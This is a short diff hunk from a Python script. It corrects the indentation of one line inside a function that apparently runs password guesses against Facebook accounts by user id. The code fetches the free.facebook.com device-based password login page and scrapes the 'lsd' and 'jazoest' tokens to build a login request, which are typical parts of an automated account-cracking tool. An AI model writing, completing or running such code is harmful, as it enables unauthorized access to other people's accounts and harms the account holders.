@@ -1106,7 +1106,7 @@ def _async(idf,pwv):
 		pw = pw.lower()
 		try:
 			if 'ya' in ualuh: ua = ualu[0]
-				wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
+			wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
 			data = {
 					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
 					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
